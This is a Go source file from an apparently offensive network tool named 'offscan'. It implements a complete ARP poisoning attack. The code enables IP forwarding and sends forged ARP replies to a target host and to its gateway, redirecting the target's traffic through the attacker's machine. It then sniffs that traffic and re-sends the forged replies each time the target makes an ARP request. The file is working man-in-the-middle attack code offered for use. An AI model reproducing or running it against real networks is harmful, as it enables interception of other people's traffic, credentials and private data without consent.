/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package arppoison

import (
	"context"
	"fmt"
	"net"
	"offscan/internal/netroute"
	"offscan/internal/packet"
	"offscan/internal/sniffer"
	"offscan/internal/sockets"
	"offscan/internal/sysconf"
	"os"
	"os/signal"
	"syscall"
	"time"
)



type arpPoison struct {
	iface     net.Interface
	addrs     addresses
	builder  *packet.ArpPacket
	socket    sockets.Layer2Socket
	sniffer  *sniffer.Sniffer
	ctx       context.Context
	cancel    context.CancelFunc
	dissec   *packet.PacketDissector
	pkts      uint
}



type addresses struct {
	myMAC      net.HardwareAddr
	targetMAC  net.HardwareAddr
	targetIP   net.IP
	apMAC	   net.HardwareAddr
	apIP       net.IP
}



func Run(args []string) {
    newArpPoison(args).execute()
}



func newArpPoison(args []string) *arpPoison {
	parser := newParser()
	parser.parseArpPoisonArgs(args)

	iface := netroute.MustRouteIfaceForDstIP(parser.targetIP)

	return &arpPoison{
		iface : iface,
		addrs : setAddrs(parser, &iface),
	}
}



func setAddrs(parser *arpPoisonParser, iface *net.Interface) addresses {
	return addresses{
		myMAC     : iface.HardwareAddr,
		targetMAC : parser.targetMAC,
		targetIP  : parser.targetIP,
		apMAC     : sysconf.MustGatewayMAC(iface),
		apIP      : sysconf.MustGatewayIP(iface),
	}
}



func (ap *arpPoison) execute() {
	sysconf.MustEnableIPForwarding()
	ap.initSniffTools()
	ap.initPoisoningTools()
	ap.sendInitialPoisoning()
	ap.sniffTargetsTraffic()
	ap.stopTools()
	sysconf.MustDisableIPForwarding()
}



func (ap *arpPoison) initSniffTools() {
	ap.sniffer = sniffer.NewSniffer(ap.iface, ap.getBPFFilter(), false)
	ap.dissec  = packet.NewPacketDissector()
	ap.createCtx()
}



func (ap *arpPoison) getBPFFilter() string {
	return fmt.Sprintf("host %s", ap.addrs.targetIP.String())
}



func (ap *arpPoison) createCtx() {
    ap.ctx, ap.cancel = context.WithCancel(context.Background())

	go func() {
        sigCh := make(chan os.Signal, 1)
        signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
        <-sigCh
        fmt.Println("\n[!] Interrupt received. Stopping...")
        ap.cancel()
    }()
}



func (ap *arpPoison) initPoisoningTools() {
	ap.socket  = sockets.NewL2Socket(&ap.iface)
	ap.builder = packet.NewArpPkt()
	ap.builder.SetReplyOpcode()
	ap.setFixedPktData()
}



func (ap *arpPoison) setFixedPktData() {
	ap.builder.SetReplyOpcode()
	ap.builder.EtherHdr.SetSrcAddr(ap.addrs.myMAC)
	ap.builder.SetSenderMAC(ap.addrs.myMAC)
}



func (ap *arpPoison) setPoisonToTarget() {
	ap.builder.EtherHdr.SetDstAddr(ap.addrs.targetMAC)
	ap.builder.SetSenderIP(ap.addrs.apIP)
	ap.builder.SetTargetMAC(ap.addrs.targetMAC)
	ap.builder.SetTargetIP(ap.addrs.targetIP)
}



func (ap *arpPoison) setPoisonToAP() {
	ap.builder.EtherHdr.SetDstAddr(ap.addrs.apMAC)
	ap.builder.SetSenderIP(ap.addrs.targetIP)
	ap.builder.SetTargetMAC(ap.addrs.apMAC)
	ap.builder.SetTargetIP(ap.addrs.apIP)
}



func (ap *arpPoison) sendInitialPoisoning() {
	delay := time.Duration(100 * time.Millisecond)
	
	ap.setPoisonToTarget()
	ap.fastPoisoning(delay)

	ap.setPoisonToAP()
	ap.fastPoisoning(delay)
}



func (ap *arpPoison) fastPoisoning(delay time.Duration) {
	for range 5 {
		ap.sendPoison()
		time.Sleep(delay)
	}
}



func (ap *arpPoison) sendPoison() {
	pkt := ap.builder.Pkt()
	ap.socket.Send(pkt)
}



func (ap *arpPoison) sniffTargetsTraffic() {
	sniffCh := ap.sniffer.Start()
	ap.displayExecInfo()

	for {
		select {
		case <- ap.ctx.Done():
			return

		default:
			pkt, ok := <-sniffCh
			if !ok { return }
			
			ap.pkts++
			ap.dissec.UpdatePkt(pkt)
			ap.sendRequestedPoison()
		}
	}
}



func (ap *arpPoison) displayExecInfo() {
	fmt.Printf("[*] IFACE...: %s\n", ap.iface.Name)
	fmt.Printf("[*] TARGET..: %s - %s\n", ap.addrs.targetMAC.String(), ap.addrs.targetIP.String())
}



func (ap *arpPoison) sendRequestedPoison() {
	if !ap.dissec.IsArpRequest() {
		return
	}

	ap.setPoisonToTarget()
	ap.sendPoison()

	timeNow := time.Now().Format("2006-01-02 15:04:05")
	fmt.Printf(
		"%s - Poison sent to %s. Packets %d sniffed\n", 
		timeNow, 
		ap.addrs.targetIP.String(), 
		ap.pkts,
	)
}




func (ap *arpPoison) stopTools() {
	ap.socket.Close()
	ap.sniffer.Stop()
}